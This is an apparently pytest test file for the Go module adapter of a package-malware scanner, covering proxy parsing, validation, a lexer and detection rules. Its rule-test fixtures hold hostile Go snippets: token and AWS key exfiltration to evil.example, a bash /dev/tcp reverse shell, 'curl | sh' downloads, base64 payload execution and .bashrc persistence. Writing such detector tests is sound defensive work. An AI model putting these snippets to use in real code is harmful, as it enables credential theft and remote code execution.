"""Go 어댑터 — 프록시 파싱(오프라인 MockTransport)·검증·스캐너·규칙·매니페스트·피드."""

from __future__ import annotations

import asyncio
import json

import httpx
import pytest

import ecosystems
from ecosystems.base import PackageNotFound, RegistryError
from ecosystems.go import registry, scanner
from engine.rules.base import MemoryTree

ADAPTER = ecosystems.get("go")


def run(coro):
    return asyncio.run(coro)


def _client(handler) -> httpx.AsyncClient:
    return httpx.AsyncClient(transport=httpx.MockTransport(handler))


# ── 레지스트리 ────────────────────────────────────────────────────

def proxy_handler(requests: list[str] | None = None, *, versions="v1.0.0\nv1.2.0\nv1.10.0\nv1.2.0-rc.1\n"):
    def handler(req: httpx.Request) -> httpx.Response:
        path = req.url.raw_path.decode()
        if requests is not None:
            requests.append(path)
        if path.endswith("/@v/list"):
            return httpx.Response(200, text=versions)
        if path.endswith("/@latest"):
            return httpx.Response(200, json={"Version": "v1.10.0", "Time": "2026-08-01T00:00:00Z",
                                             "Origin": {"VCS": "git", "URL": "https://github.com/a/b"}})
        if path.endswith(".info"):
            v = path.rsplit("/", 1)[-1][:-5]
            return httpx.Response(200, json={"Version": v, "Time": "2026-0{}-01T00:00:00Z".format(
                {"v1.0.0": 1, "v1.2.0-rc.1": 2, "v1.2.0": 3, "v1.10.0": 8}[v])})
        return httpx.Response(404)
    return handler


def test_escape_roundtrip():
    assert registry.escape("github.com/BurntSushi/toml") == "github.com/!burnt!sushi/toml"
    assert registry.unescape("github.com/!burnt!sushi/toml") == "github.com/BurntSushi/toml"
    assert registry.escape("v1.0.0-RC1") == "v1.0.0-!r!c1"


def test_fetch_project_orders_by_semver_and_uses_escaped_path():
    seen: list[str] = []

    async def go():
        async with _client(proxy_handler(seen)) as c:
            return await ADAPTER.fetch_project("github.com/BurntSushi/toml", client=c)

    p = run(go())
    assert any(s.startswith("/github.com/!burnt!sushi/toml/@v/list") for s in seen)
    assert p.ecosystem == "go" and p.latest == "v1.10.0"
    assert p.repository_url == "https://github.com/a/b"
    # v1.10.0 > v1.2.0 (문자열 정렬이면 반대)
    assert p.previous_version("v1.10.0") == "v1.2.0"
    assert p.releases["v1.2.0"].uploaded_at < p.releases["v1.10.0"].uploaded_at
    a = ADAPTER.select_artifacts(p, "v1.2.0")[0]
    assert a.url == "https://proxy.golang.org/github.com/!burnt!sushi/toml/@v/v1.2.0.zip"
    assert a.archive_format == "zip" and a.kind == "zip"


def test_pseudo_version_only_module_uses_latest():
    def handler(req):
        path = req.url.path
        if path.endswith("/@v/list"):
            return httpx.Response(200, text="")
        if path.endswith("/@latest"):
            return httpx.Response(200, json={"Version": "v0.0.0-20240101000000-abcdef123456",
                                             "Time": "2024-01-01T00:00:00Z"})
        return httpx.Response(404)

    async def go():
        async with _client(handler) as c:
            return await ADAPTER.fetch_project("example.com/m", client=c)

    p = run(go())
    assert p.latest == "v0.0.0-20240101000000-abcdef123456"
    assert p.latest in p.releases


def test_select_artifacts_for_unlisted_version():
    async def go():
        async with _client(proxy_handler()) as c:
            return await ADAPTER.fetch_project("example.com/m", client=c)

    p = run(go())
    a = ADAPTER.select_artifacts(p, "v0.0.0-20200101000000-aaaaaaaaaaaa")[0]
    assert a.url.endswith("/example.com/m/@v/v0.0.0-20200101000000-aaaaaaaaaaaa.zip")


@pytest.mark.parametrize("status", [404, 410])
def test_not_found(status):
    async def go():
        async with _client(lambda r: httpx.Response(status, text="not found: module x")) as c:
            await ADAPTER.fetch_project("github.com/no/pe", client=c)

    with pytest.raises(PackageNotFound,
                       match=r"github\.com/no/pe is not on Go module proxy \(never existed, or removed\)"):
        run(go())


@pytest.mark.parametrize("resp", [httpx.Response(500), httpx.Response(502, text="x")])
def test_server_errors_are_registry_errors(resp):
    async def go():
        async with _client(lambda r: resp) as c:
            await ADAPTER.fetch_project("example.com/m", client=c)

    with pytest.raises(RegistryError) as ei:
        run(go())
    assert not isinstance(ei.value, PackageNotFound)


def test_latest_error_and_network_error():
    def latest_500(req):
        if req.url.path.endswith("/@v/list"):
            return httpx.Response(200, text="v1.0.0\n")
        return httpx.Response(500)

    async def go(handler):
        async with _client(handler) as c:
            await ADAPTER.fetch_project("example.com/m", client=c)

    with pytest.raises(RegistryError):
        run(go(latest_500))

    def boom(req):
        raise httpx.ConnectError("down")

    with pytest.raises(RegistryError):
        run(go(boom))


def test_info_failure_does_not_fail_project():
    def handler(req):
        if req.url.path.endswith("/@v/list"):
            return httpx.Response(200, text="v1.0.0\n")
        if req.url.path.endswith("/@latest"):
            return httpx.Response(200, json={"Version": "v1.0.0", "Time": "2026-01-01T00:00:00Z"})
        return httpx.Response(500)

    async def go():
        async with _client(handler) as c:
            return await ADAPTER.fetch_project("example.com/m", client=c)

    assert run(go()).latest == "v1.0.0"


# ── 검증 ──────────────────────────────────────────────────────────

@pytest.mark.parametrize("name,ver", [
    ("github.com/gin-gonic/gin", "v1.9.1"), ("gopkg.in/yaml.v3", "v3.0.1"),
    ("github.com/BurntSushi/toml", "v1.3.2-rc.1"), ("golang.org/x/net", "v0.0.0-20190404164418-38d8ce5564a5"),
    ("github.com/foo/bar/v2", "v2.0.0+incompatible"), ("go.uber.org/zap", "v1.0.0"),
])
def test_validate_accepts(name, ver):
    ADAPTER.validate(name, ver)


@pytest.mark.parametrize("name,ver", [
    ("", "v1.0.0"), ("example", "v1.0.0"), ("github.com/a/../b", "v1.0.0"), ("github.com/a b/c", "v1.0.0"),
    ("github.com//b", "v1.0.0"), ("github.com/a;ls", "v1.0.0"), ("github.com/a/b/", "v1.0.0"),
    ("/github.com/a", "v1.0.0"), ("github.com/a\\b", "v1.0.0"), (".x.com/a", "v1.0.0"),
    ("github.com/a/b", "1.0.0"), ("github.com/a/b", "v1.0"), ("github.com/a/b", "v1.0.0/../x"),
    ("github.com/a/b", "v1.0.0;ls"), ("github.com/a/b", "latest"), ("github.com/" + "a" * 300, "v1.0.0"),
])
def test_validate_rejects(name, ver):
    with pytest.raises(ValueError):
        ADAPTER.validate(name, ver)


def test_identity_helpers():
    assert ADAPTER.normalize_name("github.com/BurntSushi/toml") == "github.com/BurntSushi/toml"
    assert ADAPTER.purl("github.com/a/b", "v1.0.0") == "pkg:golang/github.com/a/b@v1.0.0"
    assert (ADAPTER.osv_ecosystem, ADAPTER.purl_type, ADAPTER.registry_label) == (
        "Go", "golang", "Go module proxy")
    assert ADAPTER.has_install_script(None, "v1", ["x"]) is False


# ── 스캐너 ────────────────────────────────────────────────────────

def test_lexer_blanks_comments_and_string_contents_with_same_length():
    src = 'a := "x // y {" // c {\n/* { */ b := `raw { `\n'
    nc, sk = scanner.lex(src)
    assert len(nc) == len(sk) == len(src)
    assert '"x // y {"' in nc and "// c" not in nc and "/* {" not in nc
    assert "{" not in sk and "//" not in sk


def test_scanner_finds_init_bodies_by_brace_matching():
    src = '''package p
func helper() { println("}") }
func init() {
    if true { x := map[string]int{"a": 1}; _ = x }
    // } this brace is a comment
}
func (r T) init() {}
func other(v interface{}) interface{} { return v }
'''
    fs = scanner.scan_file(src)
    assert len(fs.inits) == 1
    body = fs.nc[fs.inits[0].start:fs.inits[0].end]
    assert "map[string]int" in body and "other" not in body
    assert set(fs.funcs) == {"helper", "other"}  # 메서드는 제외


def test_scanner_var_specs_and_uninvoked_literals():
    src = '''package p
var handler = func() { http.Get("x") }
var _ = func() int { http.Get("y"); return 1 }()
var (
    a = 1
    b = 2
)
'''
    fs = scanner.scan_file(src)
    assert len(fs.var_specs) == 3
    texts = [scanner.mask_uninvoked_literals(fs.nc, fs.sk, s)[0] for s in fs.var_specs]
    assert "http.Get" not in texts[0]      # 변수에 담기만 함
    assert 'http.Get("y")' in texts[1]     # 즉시 호출


# ── 규칙 ──────────────────────────────────────────────────────────

ROOT = "example.com/m@v1.0.0"


def mod(files: dict[str, str], gomod: str | None = "module example.com/m\n\ngo 1.21\n") -> MemoryTree:
    data = {f"{ROOT}/{k}": v for k, v in files.items()}
    if gomod is not None:
        data[f"{ROOT}/go.mod"] = gomod
    return MemoryTree(data)


def rules_of(tree: MemoryTree) -> dict[str, str]:
    return {f.rule: f.severity.value for f in ADAPTER.analyze_tree(tree)}


ORDINARY = '''package m

import (
    "net/http"
    "os"
    "regexp"
    "os/exec"
)

var re = regexp.MustCompile(`^[a-z]+$`)
var client = &http.Client{}
var handler = func() { http.Get("https://example.com") }

func init() {
    flag := os.Getenv("HOME")
    _ = flag
    // exec.Command("curl", "http://x") in a comment
    s := "http.Get(\\"x\\") inside a string"
    _ = s
}

func Fetch() ([]byte, error) {
    resp, err := http.Get("https://example.com/data")
    if err != nil { return nil, err }
    out, _ := exec.Command("sh", "-c", "curl http://x | sh").Output()
    _ = out
    return nil, nil
}
'''


def test_ordinary_library_code_is_clean():
    # 네트워크·exec 는 평범한 함수 안에 있을 뿐 import 시점에 돌지 않는다
    assert rules_of(mod({"m.go": ORDINARY})) == {}


def test_test_files_vendor_and_examples_are_ignored():
    evil = 'package m\nfunc init() { exec.Command("powershell", "-enc", "AA").Run() }\nimport "os/exec"'
    tree = mod({"x_test.go": evil, "vendor/a/a.go": evil, "testdata/a.go": evil,
                "examples/a.go": evil, "_old/a.go": evil})
    assert rules_of(tree) == {}


def test_build_ignore_files_skipped():
    src = "//go:build ignore\n\npackage main\nimport \"os/exec\"\nfunc init() { exec.Command(\"mshta\").Run() }\n"
    assert rules_of(mod({"gen.go": src})) == {}


def test_init_credentials_plus_network_is_high():
    src = '''package m
import (
    "net/http"
    "os"
    "strings"
)
func init() {
    t := os.Getenv("GITHUB_TOKEN")
    http.Post("https://evil.example/c", "text/plain", strings.NewReader(t))
}
'''
    f = ADAPTER.analyze_tree(mod({"m.go": src}))
    assert f[0].rule == "go-init-exfil" and f[0].severity.value == "high"
    assert f[0].location.startswith(f"{ROOT}/m.go:")


def test_import_alias_is_resolved():
    src = '''package m
import (
    h "net/http"
    sys "os"
)
func init() { h.Post("http://x.y", "a", nil); _ = sys.Getenv("AWS_SECRET_ACCESS_KEY") }
'''
    assert rules_of(mod({"m.go": src}))["go-init-exfil"] == "high"


def test_package_var_initializer_is_in_scope():
    src = '''package m
import ("net/http"; "os")
var _ = func() error { _, e := http.Get("http://x.y/?k=" + os.Getenv("API_KEY")); return e }()
'''
    assert rules_of(mod({"m.go": src}))["go-init-exfil"] == "high"


def test_init_calls_local_function_in_other_file_of_same_package():
    a = 'package m\nfunc init() { setup() }\n'
    b = '''package m
import "os/exec"
func setup() { exec.Command("sh", "-c", "curl http://1.2.3.4/x | sh").Run() }
'''
    assert rules_of(mod({"a.go": a, "b.go": b}))["go-init-suspicious-command"] == "high"


def test_function_not_called_from_init_is_not_scanned():
    src = '''package m
import "os/exec"
func Danger() { exec.Command("powershell", "-enc", "AA").Run() }
func init() {}
'''
    assert rules_of(mod({"m.go": src})) == {}


def test_suspicious_command_in_init_is_high():
    src = 'package m\nimport "os/exec"\nfunc init() { exec.Command("bash", "-c", "bash -i >& /dev/tcp/1.2.3.4/9 0>&1").Start() }\n'
    assert rules_of(mod({"m.go": src}))["go-init-suspicious-command"] == "high"


def test_payload_decode_and_exec_is_high():
    src = '''package m
import ("encoding/base64"; "os/exec"; "os")
func init() {
    b, _ := base64.StdEncoding.DecodeString("AAAA")
    os.WriteFile("/tmp/.x", b, 0755)
    exec.Command("/tmp/.x").Start()
}
'''
    assert rules_of(mod({"m.go": src}))["go-init-payload-exec"] == "high"


def test_persistence_is_high():
    src = '''package m
import "os"
func init() { os.OpenFile("/home/u/.bashrc", os.O_APPEND|os.O_WRONLY, 0600) }
'''
    # OpenFile 은 쓰기 호출이고 경로는 지속성 위치다
    assert rules_of(mod({"m.go": src}))["go-init-persistence"] == "high"


def test_webhook_anywhere_is_high():
    hook = "https://discord.com/api/webhooks/123456789012345678/" + "A" * 40
    src = f'package m\nfunc Send() {{ _ = "{hook}" }}\n'
    assert rules_of(mod({"m.go": src}))["go-exfil-endpoint"] == "high"


def test_init_network_only_is_medium():
    src = 'package m\nimport "net"\nfunc init() { net.LookupHost("metadata.example.com") }\n'
    assert rules_of(mod({"m.go": src})) == {"go-init-network": "medium"}


def test_init_unusual_spawn_is_medium_ordinary_is_not():
    src = 'package m\nimport "os/exec"\nfunc init() { exec.Command("mytool").Run() }\n'
    assert rules_of(mod({"m.go": src})) == {"go-init-spawn": "medium"}
    ok = 'package m\nimport "os/exec"\nfunc init() { exec.Command("git", "rev-parse").Run() }\n'
    assert rules_of(mod({"m.go": ok})) == {}


def test_exec_command_context_program_is_second_arg():
    src = 'package m\nimport ("context"; "os/exec")\nfunc init() { exec.CommandContext(context.TODO(), "mshta", "x").Run() }\n'
    assert rules_of(mod({"m.go": src}))["go-init-suspicious-command"] == "high"


def test_cgo_constructor_with_danger_is_high_without_is_medium():
    bad = '''package m
/*
#include <stdlib.h>
__attribute__((constructor)) static void boot(void) { system("curl http://x | sh"); }
*/
import "C"
'''
    assert rules_of(mod({"m.go": bad}))["go-cgo-constructor"] == "high"
    ctor = "__attribute__((constructor)) static void boot(void) { counter = 0; }\n"
    assert rules_of(mod({"c.c": ctor})) == {"go-cgo-constructor": "medium"}
    assert rules_of(mod({"c.c": "static int f(void) { return system(\"ls\"); }"})) == {}


def test_cgo_flags():
    bad = 'package m\n// #cgo LDFLAGS: -L. `curl http://x.y/z`\nimport "C"\n'
    assert rules_of(mod({"m.go": bad}))["go-cgo-flags"] == "high"
    plugin = 'package m\n// #cgo CFLAGS: -fplugin=./evil.so\nimport "C"\n'
    assert rules_of(mod({"m.go": plugin}))["go-cgo-flags"] == "medium"
    fine = 'package m\n// #cgo LDFLAGS: -lm -lpthread\n// #cgo CFLAGS: -O2 -DFOO=1\nimport "C"\n'
    assert rules_of(mod({"m.go": fine})) == {}


def test_go_generate_is_medium_only_for_suspicious_commands():
    ok = 'package m\n//go:generate go run github.com/golang/mock/mockgen@v1.6.0 -source=a.go\n'
    assert rules_of(mod({"m.go": ok})) == {}
    bad = 'package m\n//go:generate sh -c "curl http://x.y | sh"\n'
    assert rules_of(mod({"m.go": bad})) == {"go-generate-command": "medium"}


def test_module_path_mismatch():
    r = rules_of(mod({"m.go": "package m"}, gomod="module github.com/other/m\n"))
    assert r == {"go-module-path-mismatch": "medium"}
    assert rules_of(mod({"m.go": "package m"})) == {}
    assert rules_of(mod({"m.go": "package m"}, gomod=None)) == {}  # go.mod 없는 구형 모듈


def test_unreadable_and_oversized_reported():
    class Broken(MemoryTree):
        def read(self, relpath):
            return None if relpath.endswith("m.go") else super().read(relpath)

    t = Broken(mod({"m.go": "package m"})._data)
    assert rules_of(t) == {"go-unreadable-file": "medium"}

    class Huge(MemoryTree):
        def size(self, relpath):
            return 9_000_000 if relpath.endswith("m.go") else super().size(relpath)

    assert rules_of(Huge(mod({"m.go": "package m"})._data)) == {"go-unreadable-file": "medium"}


def test_findings_sorted_and_cwes_registered():
    src = ('package m\nimport "os/exec"\nfunc init() {\n exec.Command("mytool").Run()\n'
           ' exec.Command("mshta", "x").Run()\n}\n')
    f = ADAPTER.analyze_tree(mod({"m.go": src}, gomod="module other.com/x\n"))
    order = ["critical", "high", "medium", "low"]
    assert [x.severity.value for x in f] == sorted((x.severity.value for x in f), key=order.index)
    cwes = ADAPTER.rule_cwes()
    assert all(x.cwe in cwes[x.rule] for x in f)
    assert all(r.startswith("go-") for r in cwes)


# ── 매니페스트 ────────────────────────────────────────────────────

GOMOD = """module example.com/app

go 1.21

require github.com/gin-gonic/gin v1.9.1

require (
	github.com/stretchr/testify v1.8.4
	golang.org/x/net v0.17.0 // indirect
	github.com/local/thing v1.0.0
	github.com/old/name v1.0.0
)

replace github.com/local/thing => ../thing

replace (
	github.com/old/name => github.com/new/name v1.2.3
)

exclude github.com/bad/mod v0.0.1
retract (
	v1.0.0
)
"""


def test_parse_go_mod():
    deps = {d.name: d for d in ADAPTER.parse_manifest("proj/go.mod", GOMOD)}
    assert deps["github.com/gin-gonic/gin"].direct is True
    assert deps["github.com/gin-gonic/gin"].version == "v1.9.1"
    assert deps["golang.org/x/net"].direct is False
    assert "github.com/local/thing" not in deps          # 로컬 경로 치환
    assert deps["github.com/new/name"].version == "v1.2.3"  # 레지스트리 모듈로 치환
    assert "github.com/old/name" not in deps
    assert all(d.ecosystem == "go" and d.source == "proj/go.mod" for d in deps.values())


def test_parse_go_mod_invalid():
    with pytest.raises(ValueError):
        ADAPTER.parse_manifest("go.mod", "this is { not a go.mod")
    with pytest.raises(ValueError):
        ADAPTER.parse_manifest("go.mod", "")


GOSUM = """github.com/a/b v1.0.0 h1:abc=
github.com/a/b v1.0.0/go.mod h1:def=
golang.org/x/net v0.17.0/go.mod h1:ghi=
golang.org/x/net v0.17.0 h1:jkl=
"""


def test_parse_go_sum_dedups_gomod_hashes():
    deps = ADAPTER.parse_manifest("go.sum", GOSUM)
    assert [(d.name, d.version) for d in deps] == [("github.com/a/b", "v1.0.0"),
                                                   ("golang.org/x/net", "v0.17.0")]
    with pytest.raises(ValueError):
        ADAPTER.parse_manifest("go.sum", "garbage")
    assert ADAPTER.parse_manifest("package.json", "{}") == []


# ── 피드 ──────────────────────────────────────────────────────────

def test_feed_parses_lines_and_sends_since():
    seen = {}

    def handler(req):
        seen.update(dict(req.url.params))
        body = "\n".join(json.dumps(x) for x in [
            {"Path": "github.com/a/b", "Version": "v1.0.0", "Timestamp": "2026-11-13T00:00:00Z"},
            {"Path": "github.com/a/b", "Version": "v1.0.0", "Timestamp": "2026-11-13T00:00:01Z"},
            {"Path": "github.com/c/d", "Version": "v0.1.0", "Timestamp": "2026-11-13T00:00:02Z"},
        ]) + "\nnot json\n"
        return httpx.Response(200, text=body)

    async def go():
        async with _client(handler) as c:
            return await ADAPTER.fetch_feed(c)

    items, errors = run(go())
    assert items == [("github.com/a/b", "v1.0.0"), ("github.com/c/d", "v0.1.0")]
    assert len(errors) == 1 and "해석할 수 없는" in errors[0]
    assert seen["limit"] == "2000" and seen["since"].endswith("Z")


def test_feed_truncation_and_http_errors_reported():
    line = json.dumps({"Path": "github.com/a/b", "Version": "v1.0.0", "Timestamp": "x"})

    async def go(resp):
        async with _client(lambda r: resp) as c:
            return await ADAPTER.fetch_feed(c)

    items, errors = run(go(httpx.Response(200, text="\n".join([line] * 2000))))
    assert any("상한" in e for e in errors)
    items, errors = run(go(httpx.Response(503)))
    assert items == [] and errors


@pytest.mark.live
def test_live_toml_registry():
    async def go():
        async with httpx.AsyncClient(timeout=30, follow_redirects=True) as c:
            return await ADAPTER.fetch_project("github.com/BurntSushi/toml", client=c)

    assert "v1.3.2" in run(go()).releases


# ruff: noqa: E501
